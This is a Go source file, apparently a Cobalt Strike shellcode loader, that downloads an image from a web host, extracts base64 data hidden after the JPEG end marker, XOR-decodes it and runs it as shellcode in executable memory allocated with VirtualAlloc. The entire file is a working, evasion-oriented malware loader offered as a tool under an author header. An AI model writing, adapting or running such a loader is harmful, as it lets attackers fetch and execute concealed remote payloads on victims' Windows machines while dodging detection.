//Author: Gality
//Name：CS-Loader.go
//Usage:
//require: None
//Description: load shellcode from img
//E-mail: gality365@gmail.com

package main

import (
	"encoding/base64"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	KEY_1                  = 58
	KEY_2                  = 69
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
	imageURL := "http://127.0.0.1:8000/1.jpg"

	resp, err := http.Get(imageURL)
	if err != nil {
		os.Exit(1)
	}
	b, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		os.Exit(1)
	}
	idx := 0
	b = []byte(b)
	for i := 0; i < len(b); i++ {
		if b[i] == 255 && b[i+1] == 217 {
			break
		}
		idx++
	}
	encodeString := string(b[idx+2:])
	decodeBytes, err := base64.StdEncoding.DecodeString(encodeString)
	if err != nil {
		log.Fatalln(err)
	}
	var shellcode []byte
	for i := 0; i < len(decodeBytes); i++ {
		shellcode = append(shellcode, decodeBytes[i]^KEY_1^KEY_2)
	}
	//fmt.Println(shellcode)
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
